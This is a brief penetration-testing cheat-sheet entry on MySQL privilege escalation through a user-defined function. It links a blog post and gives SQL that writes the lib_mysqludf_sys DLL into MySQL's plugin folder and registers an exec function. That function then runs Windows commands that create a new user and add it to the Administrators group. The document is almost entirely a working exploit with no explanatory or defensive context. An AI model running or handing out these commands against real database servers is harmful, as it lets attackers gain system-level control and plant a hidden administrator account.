# MYSQL Privesc

mysql Privesc through UDF

[https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn(line) values(load_file('C://wamp//www//PHP//fileManager//users//U1//lib_mysqludf_sys_32.dll'));
SELECT * FROM npn INTO DUMPFILE 'c://wamp//bin//mysql//mysql5.6.17//lib//plugin//lib_mysqludf_sys_32.dll';
CREATE FUNCTION exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT exec("net user os51670 os51670 /add");
SELECT exec("net localgroup Administrators os51670 /add");
```

